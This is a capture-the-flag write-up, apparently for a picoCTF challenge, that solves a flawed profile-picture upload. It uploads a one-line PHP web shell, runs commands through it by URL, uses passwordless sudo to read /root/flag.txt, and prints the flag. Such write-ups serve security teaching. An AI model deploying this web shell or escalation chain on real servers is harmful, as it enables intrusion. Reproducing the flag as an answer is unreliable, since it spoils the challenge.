# Challenge description

A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.

Hint: Whenever you get a shell on a remote machine, check sudo -l

# Soluce

When we open the website, we can see that we can upload a file. We will try to upload a php file:

shell.php
```php
<?php system($_GET['cmd']); ?>
```

The website says this: `The file shell.php has been uploaded Path: uploads/shell.php `.

Then we can try to execute a command. We can use the command:
```bash
http://<REDACTED>/uploads/shell.php?cmd=sudo -l
```

We can see this:
```bash
Matching Defaults entries for www-data on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User www-data may run the following commands on challenge: (ALL) NOPASSWD: ALL 
```

So there is no password needed to execute root commands. Let's try to read the content of the /root directory. We can use the command:

```bash
http://<REDACTED>/uploads/shell.php?cmd=sudo ls /root
```

We can see this:
```bash
flag.txt
```

Then we can read the content of the flag.txt file. We can use the command:
```bash
http://<REDACTED>/uploads/shell.php?cmd=sudo cat /root/flag.txt
```

We can see the flag:
```bash
picoCTF{wh47_c4n_u_d0_wPHP_8ca28f94}
```

So the flag is `picoCTF{wh47_c4n_u_d0_wPHP_8ca28f94}`.